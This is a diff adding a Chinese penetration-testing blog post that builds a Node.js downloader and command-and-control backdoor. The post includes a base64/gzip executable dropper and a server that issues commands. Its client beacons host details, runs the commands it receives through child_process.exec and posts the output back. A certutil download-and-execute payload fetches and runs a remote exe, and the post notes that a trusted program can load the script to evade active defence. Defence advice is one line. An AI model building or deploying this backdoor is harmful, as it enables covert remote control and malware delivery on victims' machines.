@@ -1,0 +1,470 @@
+I"�@<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境,使用了一个事件驱动、非阻塞式I/O的模型，使其轻量又高效。</p>
+
+<p>我最近在一篇文章中学到了利用Node.js绕过主动防御的技巧，于是对Node.js的语法进行了学习，开源一个Downloader的实现代码，分享脚本开发中需要注意的细节。</p>
+
+<p>Node.js绕过主动防御的学习地址：</p>
+
+<p>https://bbs.pediy.com/thread-249573.htm</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>基本概念</li>
+  <li>利用Node.js实现的文件释放</li>
+  <li>利用Node.js实现的downloader</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-基本概念">0x02 基本概念</h2>
+<hr />
+
+<h3 id="nodejs同javascript的区别">Node.js同JavaScript的区别</h3>
+
+<p>JavaScript是一门语言</p>
+
+<p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境</p>
+
+<p>虽然在Windows平台下，二者的脚本文件后缀名都是.js，但二者之间的区别很大，语法也不同</p>
+
+<h3 id="nodejs的使用">Node.js的使用</h3>
+
+<p>官方文档：</p>
+
+<p>https://nodejs.org/api/</p>
+
+<p>中文资料：</p>
+
+<p>http://www.runoob.com/nodejs/nodejs-tutorial.html</p>
+
+<p>下载地址：</p>
+
+<p>https://nodejs.org/en/download/</p>
+
+<p>在Windows平台下，Node.js代码保存在.js后缀名的文件中，通过node.exe加载执行</p>
+
+<p>Node.js支持第三方包，可通过npm命令安装模块，实例如下：</p>
+
+<p>安装web框架模块express：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install express
+</code></pre></div></div>
+
+<p>使用模块express：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var express = require('express');
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>本文涉及的代码均不使用第三方包，只使用安装包中的node.exe</p>
+
+<h2 id="0x03-利用nodejs实现的文件释放">0x03 利用Node.js实现的文件释放</h2>
+<hr />
+
+<h3 id="实现思路">实现思路：</h3>
+
+<p>将exe文件做base64编码存储在文件中，释放时先读取文件进行解码，最后写入文件</p>
+
+<h4 id="1-读取文件内容做base64编码并输出到datatxt">1. 读取文件内容，做base64编码并输出到data.txt</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_encode(file) {
+	var fs = require('fs');
+	var data = fs.readFileSync(file);
+	return Buffer.from(data).toString('base64');
+}
+var base64str = base64_encode('test.exe');
+console.log(base64str);
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">fs.readFileSync</code>表示同步读取，异步读取使用<code class="language-plaintext highlighter-rouge">fs.readFile</code></p>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.js base64encode.js &gt;data.txt
+</code></pre></div></div>
+
+<h4 id="2-读取datatxt中保存的加密字符串base64解码并生成新的文件test2exe">2. 读取data.txt中保存的加密字符串，base64解码并生成新的文件test2.exe</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_decode(base64str, file) {
+	var data = Buffer.from(base64str, 'base64');
+    fs.writeFileSync(file, data);
+}
+var fs = require('fs');
+var base64str = fs.readFileSync('data.txt');
+console.log(base64str.toString());
+base64_decode(base64str.toString(), 'test2.exe');
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>使用代码<code class="language-plaintext highlighter-rouge">var base64str = fs.readFileSync('data.txt');</code>在读取文件后，变量<strong>base64str</strong>需要强制转换成字符串类型，即<code class="language-plaintext highlighter-rouge">base64str.toString()</code></p>
+
+<p>为了缩小文件长度，加入压缩算法gzip</p>
+
+<h4 id="1-读取testexe中的内容做gzip压缩后保存到文件datagz">1. 读取test.exe中的内容，做gzip压缩后保存到文件data.gz</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function gunzip(sourcePath) {
+	var zlib = require('zlib');
+	var fs = require('fs');
+  	var unzip = zlib.createGunzip(); 
+  	var rs = fs.createReadStream(sourcePath); 
+  	var ws = fs.createWriteStream('test2.exe');
+  	rs.pipe(unzip).pipe(ws);
+}
+gunzip('data.gz');
+</code></pre></div></div>
+
+<h4 id="2-读取datagz中的内容做gzip解压缩后保存到文件test2exe">2. 读取data.gz中的内容，做gzip解压缩后保存到文件test2.exe</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var zlib = require('zlib');
+var fs = require('fs');
+function gunzip(sourcePath) {
+  var unzip = zlib.createGunzip(); 
+  var rs = fs.createReadStream(sourcePath); 
+  var ws = fs.createWriteStream('test2.exe');
+  rs.pipe(unzip).pipe(ws);
+}
+gunzip('data.gz');
+</code></pre></div></div>
+
+<h2 id="0x04-利用nodejs实现的downloader">0x04 利用Node.js实现的downloader</h2>
+<hr />
+
+<h3 id="实现思路-1">实现思路：</h3>
+
+<h4 id="1-server">1. Server</h4>
+
+<ul>
+  <li>监听指定端口，等待客户端连接，记录客户端的IP、连接时间和post数据</li>
+  <li>对客户端的数据包进行筛选，对符合条件1的客户端返回控制命令，对符合条件2的客户端在当前控制台显示客户端发来的命令执行结果，否则返回404页面</li>
+</ul>
+
+<h4 id="2-client">2. Client</h4>
+
+<ul>
+  <li>连接指定服务器，发送固定格式的post数据，包括当前系统的主机名和操作系统版本</li>
+  <li>接收服务器返回的控制命令，执行后将结果再次发送到服务器</li>
+  <li>如果服务器未响应，等待一段时间后再次发送post请求</li>
+</ul>
+
+<p>需要考虑如下问题：</p>
+
+<h4 id="1-通过nodejs执行cmd命令">1. 通过Node.js执行cmd命令</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function runcmd(command) {
+	var childprocess = require('child_process');
+	childprocess.exec(command, (err, stdout, stderr) =&gt; {
+  	if (err) {
+    		console.error(err);
+    		return;
+  	}
+  	console.log(stdout);
+	});
+}
+runcmd('whoami');
+</code></pre></div></div>
+
+<h4 id="2-http通信的实现">2. HTTP通信的实现</h4>
+
+<p>Server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var http = require('http');
+var querystring = require('querystring');
+http.createServer(function (req, res) {
+    	var body = '';
+    	console.log('req.url:',req.url);
+    	req.on('data', function (chunk) {
+		body += chunk;
+        	console.log("chunk:",chunk);
+    	});
+    	req.on('end', function () {
+        	body = querystring.parse(body);  
+        	console.log('body:',body);
+        	res.write('Message from server');
+        	res.end();
+    	});
+}).listen(3000,'0.0.0.0');
+</code></pre></div></div>
+
+<p>Client:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sendHello(host1,port1){
+	var http = require('http');	
+	var querystring = require('querystring');
+	var contents = querystring.stringify({
+    		data1:'str1',
+    		data2:'str2'	
+	});
+	var options = {
+    		host: host1,
+    		port: port1,
+    		path: '/',
+    		method:'POST',
+    		headers:{
+        		'Content-Type':'application/x-www-form-urlencoded',
+        		'Content-Length':contents.length
+    		}
+	}
+	console.log('post options:\n',options);
+	console.log('content:',contents);
+
+	var req = http.request(options, function(res){
+    		console.log('headers:', res.headers);
+    		var data1='';
+    		res.on('data', function(chunk){
+      			data1 += chunk;
+    		});
+    		res.on('end', function(){
+      			console.log('result:',data1)
+    		});
+	});
+	req.write(contents);
+	req.end;
+};
+sendHello('127.0.0.1','3000');
+</code></pre></div></div>
+
+<p>Client向Server发送post数据，内容为<code class="language-plaintext highlighter-rouge">data1=str1&amp;data2=str2</code></p>
+
+<p>Server收到请求后，向Client回复的内容为<code class="language-plaintext highlighter-rouge">Message from server</code></p>
+
+<h4 id="3-sleep的实现">3. sleep的实现</h4>
+
+<p>Node.js默认不支持sleep操作，这里可以自己实现：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
+	var startTime =new Date().getTime();
+	while(new Date().getTime()&lt; startTime + milliSeconds);
+}
+var timeinterval = +'5000';
+sleep(timeinterval);
+</code></pre></div></div>
+
+<p>字符串类型转换为数字，可在前面加<code class="language-plaintext highlighter-rouge">+</code></p>
+
+<h4 id="4-client定时循环发送post请求">4. Client定时循环发送post请求</h4>
+
+<p>这里需要考虑异步和同步的问题</p>
+
+<p>Node.js是异步编程，但Client定时循环发送post请求需要使用同步实现，测试代码如下：</p>
+
+<p>Server:</p>
+
+<p>代码同上</p>
+
+<p>Client:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
+	var startTime =new Date().getTime();
+	while(new Date().getTime()&lt; startTime + milliSeconds);
+}
+function sendHello(host1,port1){
+	var http = require('http');	
+	var querystring = require('querystring');
+	var contents = querystring.stringify({
+    		data1:'str1',
+    		data2:'str2'	
+	});
+	var options = {
+    		host: host1,
+    		port: port1,
+    		path: '/',
+    		method:'POST',
+    		headers:{
+        		'Content-Type':'application/x-www-form-urlencoded',
+        		'Content-Length':contents.length
+    		}
+	}
+	console.log('post options:\n',options);
+	console.log('content:',contents);
+
+	var req = http.request(options, function(res){
+    		console.log('headers:', res.headers);
+    		var data1='';
+    		res.on('data', function(chunk){
+      			data1 += chunk;
+    		});
+    		res.on('end', function(){
+      			console.log('result:',data1)
+    		});
+	});
+	req.write(contents);
+	req.end;
+};
+while (true)
+{
+	console.log('1');
+	sleep(5000);
+	sendHello('127.0.0.1','3000');
+}
+</code></pre></div></div>
+
+<p><strong>期待的结果：</strong></p>
+
+<p>Clinet每隔5秒发送一个post请求，接收结果</p>
+
+<p><strong>实际的结果：</strong></p>
+
+<p>每隔5秒执行一次循环，但Clinet没有发出请求</p>
+
+<p>由于我们最初的设想是不使用npm，所以也无法使用async模块实现同步</p>
+
+<p>最终，我通过方法嵌套解决了同步问题，示例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
+	var startTime =new Date().getTime();
+	while(new Date().getTime()&lt; startTime + milliSeconds);
+}
+function A(){
+	console.log('A');
+	B();	
+}
+function B(){
+	console.log('B');
+	sleep(5000);
+	A();	
+}
+A();
+</code></pre></div></div>
+
+<h4 id="5-server显示client的ip">5. Server显示Client的IP</h4>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function getClientIp(req) {
+        return req.headers['x-forwarded-for'] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        req.connection.socket.remoteAddress;
+};
+</code></pre></div></div>
+
+<p>默认为格式为ipv6，例如：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:127.0.0.1
+</code></pre></div></div>
+
+<p>可以通过修改listen的参数指定为ipv4</p>
+
+<p>修改前：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000);
+</code></pre></div></div>
+
+<p>修改后：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000,'0.0.0.0');
+</code></pre></div></div>
+
+<h4 id="6-server判断post请求不符合要求的回复404">6. Server判断post请求，不符合要求的回复404</h4>
+
+<p>对body的内容进行判断即可</p>
+
+<p>完整实现代码已开源，地址：</p>
+
+<p>https://github.com/3gstudent/NodeJS-Downloader</p>
+
+<p><strong>注：</strong></p>
+
+<p>开源的代码仅仅是一个示例，用作演示NodeJS的功能</p>
+
+<p>用法如下：</p>
+
+<p>需要先获得node.exe，下载地址： https://nodejs.org/en/download/</p>
+
+<h4 id="1-编辑文件serverjs">1. 编辑文件Server.js</h4>
+
+<p>可编译以下内容：</p>
+
+<ul>
+  <li>向Client发送的命令：<code class="language-plaintext highlighter-rouge">var command</code></li>
+  <li>监听端口： <code class="language-plaintext highlighter-rouge">.listen(80,'0.0.0.0');</code></li>
+</ul>
+
+<h4 id="2-启动server">2. 启动Server</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Server.js
+</code></pre></div></div>
+
+<p>监听指定端口，等待客户端连接，记录客户端的IP、连接时间和post数据</p>
+
+<p>对客户端的数据包进行筛选，对初次访问的客户端返回控制命令，对第二次访问的客户端在当前控制台显示客户端发来的命令执行结果，否则返回404页面</p>
+
+<h4 id="3-编辑文件clientjs">3. 编辑文件Client.js</h4>
+
+<p>可编译以下内容：</p>
+
+<ul>
+  <li>Server的IP：<code class="language-plaintext highlighter-rouge">var serverip</code></li>
+  <li>Server的端口：<code class="language-plaintext highlighter-rouge">var serverport</code></li>
+  <li>循环间隔时间：<code class="language-plaintext highlighter-rouge">var timeinterval</code></li>
+</ul>
+
+<h4 id="4-启动client">4. 启动Client</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Client.js
+</code></pre></div></div>
+
+<p>Client将会连接Server，发送固定格式的post数据，包括当前系统的主机名和操作系统版本</p>
+
+<p>接下来接收Server返回的控制命令，执行后将结果再次发送到Server</p>
+
+<p>如果Server未响应，等待一段时间后再次发送post请求</p>
+
+<h2 id="0x05-利用思路">0x05 利用思路</h2>
+<hr />
+
+<h4 id="1开源的代码支持多种payload">1、开源的代码支持多种payload</h4>
+
+<p>可将payload设置为下载文件并执行，例如</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&amp;&amp;c:\\a.exe';
+</code></pre></div></div>
+
+<p>更多下载执行的命令可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95">《渗透技巧——从github下载文件的多种方法》</a></p>
+
+<p><strong>注：</strong></p>
+
+<p>发送Client退出的命令可使用：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'taskkill /f /im node.exe';
+</code></pre></div></div>
+
+<h4 id="2可被第三方可信程序加载">2、可被第三方可信程序加载</h4>
+
+<p>参考：</p>
+
+<p>https://bbs.pediy.com/thread-249573.htm</p>
+
+<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>
+
+<p>演示如图：</p>
+
+<p><img src="https://github.com/3gstudent/NodeJS-Downloader/blob/master/1.png?raw=true" alt="Alt text" /></p>
+
+<h2 id="0x06-防御建议">0x06 防御建议</h2>
+<hr />
+
+<p>对t.exe的子进程(node.exe)行为进行判断，如果有可疑行为进行拦截</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr />
+
+<p>本文介绍了在开发Node.js代码时需要注意的细节，开源了一段Downloader的测试代码，用来演示Node.js的功能。</p>
+
+<p>简要分析在渗透测试中的利用思路，给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
